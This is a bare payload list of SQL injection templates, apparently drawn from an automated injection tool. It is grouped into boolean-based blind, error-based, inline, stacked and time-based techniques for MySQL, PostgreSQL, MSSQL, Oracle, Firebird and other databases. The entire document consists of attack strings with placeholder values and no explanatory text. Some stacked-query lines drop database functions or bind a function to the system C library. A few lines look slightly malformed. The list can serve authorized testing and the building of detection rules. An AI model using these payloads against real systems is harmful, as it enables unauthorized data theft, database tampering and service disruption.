#boolean-based blind tests - where/having clause1
and [random]=[random]
or [random]=[random]
or not [random]=[random]
rlike (select (case when ([random]=[random]) then [origvalue] else 0x28 end))
and make_set([random]=[random],[random])
or make_set([random]=[random],[random])
and elt([random]=[random],[random])
or elt ([random]=[random],[random])
and ([random]=[random])*[random]
or ([random]=[random])*[random]
and (select (case when ([random]=[random]) then null else cast('[random]' as numeric) end)) is null
or (select (case when ([random]=[random]) then null else cast('[random]' as numeric) end)) is null
and (select (case when ([randnum]=[randnum]) then null else ctxsys.drithsx.sn(1,[randnum]) end) from dual) is null
or (select (case when ([randnum]=[randnum]) then null else ctxsys.drithsx.sn(1,[randnum]) end) from dual) is null

#boolean-based blind tests - parameter replace
select (case when ([randnum]=[randnum]) then [randnum] else [randnum]*(select [randnum] from information_schema.plugins) end)
make_set([randnum]=[randnum],[randnum1])
make_set([randnum]=[randnum],[origvalue])
elt([randnum]=[randnum],[randnum1])
elt([randnum]=[randnum],[origvalue])

select (case when ([randnum]=[randnum]) then [randnum] else 1/(select 0) end)
select (case when ([randnum]=[randnum]) then [origvalue] else 1/(select 0) end)
select * from generate_series([randnum],[randnum],case when ([randnum]=[randnum]) then 1 else 0 end) limit 1
select [origvalue] from generate_series([randnum],[randnum],case when ([randnum]=[randnum]) then 1 else 0 end) limit 1
select (case when ([randnum]=[randnum]) then [randnum] else [randnum]*(select [randnum] union all select [randnum1]) end)
select (case when ([randnum]=[randnum]) then [origvalue] else [randnum]*(select [randnum] union all select [randnum1]) end)
select (case when ([randnum]=[randnum]) then [randnum] else cast(1 as int)/(select 0 from dual) end) from dual
select (case when ([randnum]=[randnum]) then [origvalue] else cast(1 as int)/(select 0 from dual) end) from dual
select (case when ([randnum]=[randnum]) then [randnum] else 1/0 end) from sysmaster:sysdual)
select (case when ([randnum]=[randnum]) then [origvalue] else [randnum] end) from sysmaster:sysdual)
iif([randnum]=[randnum],[randnum],1/0)
iif([randnum]=[randnum],[origvalue],1/0)
case when ([randnum]=[randnum]) then [randnum] else [randnum]*(select [randnum] from dual union select [randnum1] from dual) end
case when ([randnum]=[randnum]) then [origvalue] else [randnum]*(select [randnum] from dual union select [randnum1] from dual) end

#boolean-based blind tests - order by, group by clause 
select (case when ([randnum]=[randnum]) then 1 else [randnum]*(select [randnum] from information_schema.plugins) end)
select (case when ([randnum]=[randnum]) then [origvalue] else [randnum]*(select [randnum] from information_schema.plugins) end)
select (case when ([randnum]=[randnum]) then 1 else [randnum]*(select [randnum] from information_schema.plugins) end)
select (case when ([randnum]=[randnum]) then [origvalue] else [randnum]*(select [randnum] from information_schema.plugins) end)
select (case when ([randnum]=[randnum]) then 1 else 1/(select 0) end)
select (case when ([randnum]=[randnum]) then [origvalue] else 1/(select 0) end)
select * from generate_series([randnum],[randnum],case when ([randnum]=[randnum]) then 1 else 0 end) limit 1
select (case when ([randnum]=[randnum]) then 1 else [randnum]*(select [randnum] union all select [randnum1]) end)
select (case when ([randnum]=[randnum]) then [origvalue] else [randnum]*(select [randnum] union all select [randnum1]) end)
select (case when ([randnum]=[randnum]) then 1 else cast(1 as int)/(select 0 from dual) end) from dual
select (case when ([randnum]=[randnum]) then [origvalue] else cast(1 as int)/(select 0 from dual) end) from dual
iif([randnum]=[randnum],1,1/0
iif([randnum]=[randnum],[origvalue],1/0
case when [randnum]=[randnum] then 1 else null end

#boolean-based blind tests - stacked queries
select (case when ([randnum]=[randnum]) then [randnum] else [randnum]*(select [randnum] from information_schema.plugins) end)
select (case when ([randnum]=[randnum]) then [randnum] else [randnum]*(select [randnum] from information_schema.plugins) end)
select (case when ([randnum]=[randnum]) then [randnum] else 1/(select 0) end)
select * from generate_series([randnum],[randnum],case when ([randnum]=[randnum]) then 1 else 0 end) limit 1
if([randnum]=[randnum]) select [randnum] else drop function [randstr]
select (case when ([randnum]=[randnum]) then 1 else [randnum]*(select [randnum] union all select [randnum1]) end)
select (case when ([randnum]=[randnum]) then [randnum] else cast(1 as int)/(select 0 from dual) end) from dual
iif([randnum]=[randnum],1,1/0)

#error-based tests - where, having, order by or group by clause
and (select 2*(if((select * from (select concat('[delimiter_start]',(select (elt([randnum]=[randnum],1))),'[delimiter_stop]','x'))s), 8446744073709551610, 8446744073709551610)))
or (select 2*(if((select * from (select concat('[delimiter_start]',([query]),'[delimiter_stop]','x'))s), 8446744073709551610, 8446744073709551610)))
or exp(~(select * from (select concat('[delimiter_start]',(select (elt([randnum]=[randnum],1))),'[delimiter_stop]','x'))x))
and json_keys((select convert((select concat('[delimiter_start]',(select (elt([randnum]=[randnum],1))),'[delimiter_stop]')) using utf8)))
or json_keys((select convert((select concat('[delimiter_start]',(select (elt([randnum]=[randnum],1))),'[delimiter_stop]')) using utf8)))
and (select [randnum] from(select count(*),concat('[delimiter_start]',(select (elt([randnum]=[randnum],1))),'[delimiter_stop]',floor(rand(0)*2))x from information_schema.plugins group by x)a)
or (select [randnum] from(select count(*),concat('[delimiter_start]',(select (elt([randnum]=[randnum],1))),'[delimiter_stop]',floor(rand(0)*2))x from information_schema.plugins group by x)a)
and extractvalue([randnum],concat('\\','[delimiter_start]',(select (elt([randnum]=[randnum],1))),'[delimiter_stop]'))
or extractvalue([randnum],concat('\\','[delimiter_start]',(select (elt([randnum]=[randnum],1))),'[delimiter_stop]'))
and updatexml([randnum],concat('.','[delimiter_start]',(select (elt([randnum]=[randnum],1))),'[delimiter_stop]'),[randnum1])
or updatexml([randnum],concat('.','[delimiter_start]',(select (elt([randnum]=[randnum],1))),'[delimiter_stop]'),[randnum1])
and row([randnum],[randnum1])>(select count(*),concat('[delimiter_start]',(select (elt([randnum]=[randnum],1))),'[delimiter_stop]',floor(rand(0)*2))x from (select [randnum2] union select [randnum3] union select [randnum4] union select [randnum5])a group by x)
or row([randnum],[randnum1])>(select count(*),concat('[delimiter_start]',(select (elt([randnum]=[randnum],1))),'[delimiter_stop]',floor(rand(0)*2))x from (select [randnum2] union select [randnum3] union select [randnum4] union select [randnum5])a group by x)
or 1 group by concat('[delimiter_start]',(select (case when ([randnum]=[randnum]) then 1 else 0 end)),'[delimiter_stop]',floor(rand(0)*2)) having min(0)
and [randnum]=cast('[delimiter_start]'||(select (case when ([randnum]=[randnum]) then 1 else 0 end))::text||'[delimiter_stop]' as numeric)
or [randnum]=cast('[delimiter_start]'||(select (case when ([randnum]=[randnum]) then 1 else 0 end))::text||'[delimiter_stop]' as numeric)
and [randnum] in (select ('[delimiter_start]'+(select (case when ([randnum]=[randnum]) then '1' else '0' end))+'[delimiter_stop]'))
or [randnum] in (select ('[delimiter_start]'+(select (case when ([randnum]=[randnum]) then '1' else '0' end))+'[delimiter_stop]'))
and [randnum]=convert(int,(select '[delimiter_start]'+(select (case when ([randnum]=[randnum]) then '1' else '0' end))+'[delimiter_stop]'))
or [randnum]=convert(int,(select '[delimiter_start]'+(select (case when ([randnum]=[randnum]) then '1' else '0' end))+'[delimiter_stop]'))
and [randnum]=concat('[delimiter_start]',(select (case when ([randnum]=[randnum]) then '1' else '0' end)),'[delimiter_stop]')
or [randnum]=concat('[delimiter_start]',(select (case when ([randnum]=[randnum]) then '1' else '0' end)),'[delimiter_stop]')
and [randnum]=(select upper(xmltype(chr(60)||chr(58)||'[delimiter_start]'||(select (case when ([randnum]=[randnum]) then 1 else 0 end) from dual)||'[delimiter_stop]'||chr(62))) from dual)
or [randnum]=(select upper(xmltype(chr(60)||chr(58)||'[delimiter_start]'||(select (case when ([randnum]=[randnum]) then 1 else 0 end) from dual)||'[delimiter_stop]'||chr(62))) from dual)
and [randnum]=utl_inaddr.get_host_address('[delimiter_start]'||(select (case when ([randnum]=[randnum]) then 1 else 0 end) from dual)||'[delimiter_stop]')
or [randnum]=utl_inaddr.get_host_address('[delimiter_start]'||(select (case when ([randnum]=[randnum]) then 1 else 0 end) from dual)||'[delimiter_stop]')
and [randnum]=ctxsys.drithsx.sn([randnum],('[delimiter_start]'||(select (case when ([randnum]=[randnum]) then 1 else 0 end) from dual)||'[delimiter_stop]'))
or [randnum]=ctxsys.drithsx.sn([randnum],('[delimiter_start]'||(select (case when ([randnum]=[randnum]) then 1 else 0 end) from dual)||'[delimiter_stop]'))
and [randnum]=dbms_utility.sqlid_to_sqlhash(('[delimiter_start]'||(select (case when ([randnum]=[randnum]) then 1 else 0 end) from dual)||'[delimiter_stop]'))
or [randnum]=dbms_utility.sqlid_to_sqlhash(('[delimiter_start]'||(select (case when ([randnum]=[randnum]) then 1 else 0 end) from dual)||'[delimiter_stop]'))
and [randnum]=('[delimiter_start]'||(select case [randnum] when [randnum] then 1 else 0 end from rdb$database)||'[delimiter_stop]')
or [randnum]=('[delimiter_start]'||(select case [randnum] when [randnum] then 1 else 0 end from rdb$database)||'[delimiter_stop]')

#error-based tests - limit clause
procedure analyse(extractvalue([randnum],concat('\\','[delimiter_start]',(select (case when ([randnum]=[randnum]) then 1 else 0 end)),'[delimiter_stop]')),1)

#error-based tests - parameter replace
select 2*(if((select * from (select concat('[delimiter_start]',(select (elt([randnum]=[randnum],1))),'[delimiter_stop]','x'))s), 8446744073709551610, 8446744073709551610))
exp(~(select * from (select concat('[delimiter_start]',(select (elt([randnum]=[randnum],1))),'[delimiter_stop]','x'))x))
json_keys((select convert((select concat('[delimiter_start]',(select (elt([randnum]=[randnum],1))),'[delimiter_stop]')) using utf8))
select [randnum] from(select count(*),concat('[delimiter_start]',(select (elt([randnum]=[randnum],1))),'[delimiter_stop]',floor(rand(0)*2))x from information_schema.plugins group by x)a
updatexml([randnum],concat('.','[delimiter_start]',(select (elt([randnum]=[randnum],1))),'[delimiter_stop]'),[randnum1])
extractvalue([randnum],concat('\\','[delimiter_start]',(select (elt([randnum]=[randnum],1))),'[delimiter_stop]'))
cast('[delimiter_start]'||(select (case when ([randnum]=[randnum]) then 1 else 0 end))::text||'[delimiter_stop]' as numeric)
cast('[delimiter_start]'||(select 1 from generate_series([randnum],[randnum],case when ([randnum]=[randnum]) then 1 else 0 end) limit 1)::text||'[delimiter_stop]' as numeric)
convert(int,(select '[delimiter_start]'+(select (case when ([randnum]=[randnum]) then '1' else '0' end))+'[delimiter_stop]'))
select '[delimiter_start]'+(select (case when ([randnum]=[randnum]) then '1' else '0' end))+'[delimiter_stop]'
select upper(xmltype(chr(60)||chr(58)||'[delimiter_start]'||(select (case when ([randnum]=[randnum]) then 1 else 0 end) from dual)||'[delimiter_stop]'||chr(62))) from dual
select [randnum]=('[delimiter_start]'||(select case [randnum] when [randnum] then 1 else 0 end from rdb$database)||'[delimiter_stop]')
select [randnum] from (select 2*(if((select * from (select concat('[delimiter_start]',(select (elt([randnum]=[randnum],1))),'[delimiter_stop]','x'))s), 8446744073709551610, 8446744073709551610)))x
select [randnum] from (select exp(~(select * from (select concat('[delimiter_start]',(select (elt([randnum]=[randnum],1))),'[delimiter_stop]','x'))x)))s
select [randnum] from (select json_keys((select convert((select concat('[delimiter_start]',(select (elt([randnum]=[randnum],1))),'[delimiter_stop]')) using utf8))))x
select [randnum] from(select count(*),concat('[delimiter_start]',(select (elt([randnum]=[randnum],1))),'[delimiter_stop]',floor(rand(0)*2))x from information_schema.plugins group by x)a
extractvalue([randnum],concat('\\','[delimiter_start]',(select (elt([randnum]=[randnum],1))),'[delimiter_stop]')
pdatexml([randnum],concat('.','[delimiter_start]',(select (elt([randnum]=[randnum],1))),'[delimiter_stop]'),[randnum1]
select [randnum] from (select row([randnum],[randnum1])>(select count(*),concat('[delimiter_start]',(select (elt([randnum]=[randnum],1))),'[delimiter_stop]',floor(rand(0)*2))x from (select [randnum2] union select [randnum3] union select [randnum4] union select [randnum5])a group by x))s
cast('[delimiter_start]'||(select (case when ([randnum]=[randnum]) then 1 else 0 end))::text||'[delimiter_stop]' as numeric)
cast('[delimiter_start]'||(select 1 from generate_series([randnum],[randnum],case when ([randnum]=[randnum]) then 1 else 0 end) limit 1)::text||'[delimiter_stop]' as numeric)
select [randnum] where [randnum]=convert(int,(select '[delimiter_start]'+(select (case when ([randnum]=[randnum]) then '1' else '0' end))+'[delimiter_stop]'))
select upper(xmltype(chr(60)||chr(58)||'[delimiter_start]'||(select (case when ([randnum]=[randnum]) then 1 else 0 end) from dual)||'[delimiter_stop]'||chr(62))) from dual

#inline queries tests
select concat('[delimiter_start]',(select (elt([randnum]=[randnum],1))),'[delimiter_stop]')
select '[delimiter_start]'||(select (case when ([randnum]=[randnum]) then 1 else 0 end))::text||'[delimiter_stop]'
select '[delimiter_start]'+(select (case when ([randnum]=[randnum]) then '1' else '0' end))+'[delimiter_stop]'
select '[delimiter_start]'||(select (case when ([randnum]=[randnum]) then 1 else 0 end) from dual)||'[delimiter_stop]' from dual
select '[delimiter_start]'||(select (case when ([randnum]=[randnum]) then 1 else 0 end))||'[delimiter_stop]'
select '[delimiter_start]'||(case [randnum] when [randnum] then 1 else 0 end)||'[delimiter_stop]' from rdb$database

#stacked queries tests
select sleep([sleeptime])
select * from (select(sleep([sleeptime])))[randstr]
select * from (select(sleep([sleeptime])))[randstr]
select benchmark([sleeptime]000000,md5('[randstr]'))
select benchmark([sleeptime]000000,md5('[randstr]'))
select pg_sleep([sleeptime])
select count(*) from generate_series(1,[sleeptime]000000)
create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep([sleeptime])
create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep([sleeptime])
waitfor delay '0:0:[sleeptime]'
waitfor delay '0:0:[sleeptime]'
select dbms_pipe.receive_message('[randstr]',[sleeptime]) from dual
select dbms_pipe.receive_message('[randstr]',[sleeptime]) from dual
select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5
select case when ([inference]) then (select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) else [randnum] end from dual
begin dbms_lock.sleep([sleeptime]); end
begin user_lock.sleep([sleeptime]); end
select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3
select like('abcdefg',upper(hex(randomblob([sleeptime]00000000/2))))
select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4
select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3
call regexp_substring(repeat(right(char([randnum]),0),[sleeptime]00000000),null)
call regexp_substring(repeat(left(crypt_key('aes',null),0),[sleeptime]00000000),null)

#time-based boolean tests
and sleep([sleeptime])
or sleep([sleeptime])
and (select * from (select(sleep([sleeptime])))[randstr])
or (select * from (select(sleep([sleeptime])))[randstr])
and [randnum]=benchmark([sleeptime]000000,md5('[randstr]'))
or [randnum]=benchmark([sleeptime]000000,md5('[randstr]'))
rlike sleep([sleeptime])
rlike (select * from (select(sleep([sleeptime])))[randstr])
and elt([randnum]=[randnum],sleep([sleeptime]))
or elt([randnum]=[randnum],sleep([sleeptime]))
and [randnum]=(select [randnum] from pg_sleep([sleeptime]))
or [randnum]=(select [randnum] from pg_sleep([sleeptime]))
and [randnum]=(select count(*) from generate_series(1,[sleeptime]000000))
or [randnum]=(select count(*) from generate_series(1,[sleeptime]000000))
and [randnum]=(select count(*) from generate_series(1,[sleeptime]000000))
or [randnum]=(select count(*) from generate_series(1,[sleeptime]000000))
waitfor delay '0:0:[sleeptime]'
waitfor delay '0:0:[sleeptime]'
and [randnum]=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)
or [randnum]=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)
and [randnum]=dbms_pipe.receive_message('[randstr]',[sleeptime])
or [randnum]=dbms_pipe.receive_message('[randstr]',[sleeptime])
and [randnum]=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)
or [randnum]=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)
and [randnum]=like('abcdefg',upper(hex(randomblob([sleeptime]00000000/2))))
or [randnum]=like('abcdefg',upper(hex(randomblob([sleeptime]00000000/2))))
and [randnum]=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)
or [randnum]=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)
and [randnum]=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)
or [randnum]=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)
and '[randstr]'=regexp_substring(repeat(right(char([randnum]),0),[sleeptime]000000000),null)
or '[randstr]'=regexp_substring(repeat(right(char([randnum]),0),[sleeptime]000000000),null)
and '[randstr]'=regexp_substring(repeat(left(crypt_key('aes',null),0),[sleeptime]00000000),null)
or '[randstr]'=regexp_substring(repeat(left(crypt_key('aes',null),0),[sleeptime]00000000),null)
and [randnum]=(select count(*) from sysmaster:syspaghdr)
or [randnum]=(select count(*) from sysmaster:syspaghdr)

#time-based boolean tests - numerous clauses
procedure analyse(extractvalue([randnum],concat('\\',(benchmark([sleeptime]000000,md5('[randstr]'))))),1)
procedure analyse(extractvalue([randnum],concat('\\',(benchmark([sleeptime]000000,md5('[randstr]'))))),1)
case when ([randnum]=[randnum]) then sleep([sleeptime]) else [randnum] end
select * from (select(sleep([sleeptime])))[randstr]
case when ([randnum]=[randnum]) then (select benchmark([sleeptime]000000,md5('[randstr]'))) else [randnum]
[randnum]=[randnum] and sleep([sleeptime])
elt([randnum]=[randnum],sleep([sleeptime]))
make_set([randnum]=[randnum],sleep([sleeptime]))
select [randnum] from pg_sleep([sleeptime])
select count(*) from generate_series(1,[sleeptime]000000)
select (case when ([randnum]=[randnum]) then (select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) else [randnum] end)
begin if ([randnum]=[randnum]) then dbms_lock.sleep([sleeptime]); else dbms_lock.sleep(0); end if; end;
select (case when ([randnum]=[randnum]) then dbms_pipe.receive_message('[randstr]',[sleeptime]) else [randnum] end) from dual
select (case when ([randnum]=[randnum]) then (select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) else [randnum] end) from dual
select like('abcdefg',upper(hex(randomblob([sleeptime]00000000/2))))
select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4
select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3
select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3

#time-based boolean tests - order by, group by clause
select (case when ([randnum]=[randnum]) then sleep([sleeptime]) else [randnum] end)
select (case when ([randnum]=[randnum]) then (select benchmark([sleeptime]000000,md5('[randstr]'))) else [randnum]*(select [randnum] from mysql.db) end)
select (case when ([randnum]=[randnum]) then (select [randnum] from pg_sleep([sleeptime])) else 1/(select 0) end)
select (case when ([randnum]=[randnum]) then (select count(*) from generate_series(1,[sleeptime]000000)) else 1/(select 0) end)
select (case when ([randnum]=[randnum]) then (select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) else [randnum]*(select [randnum] union all select [randnum1]) end)
begin if ([randnum]=[randnum]) then dbms_lock.sleep([sleeptime]); else dbms_lock.sleep(0); end if; end;
select (case when ([randnum]=[randnum]) then dbms_pipe.receive_message('[randstr]',[sleeptime]) else 1/(select 0 from dual) end) from dual
select (case when ([randnum]=[randnum]) then (select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) else 1/(select 0 from dual) end) from dual


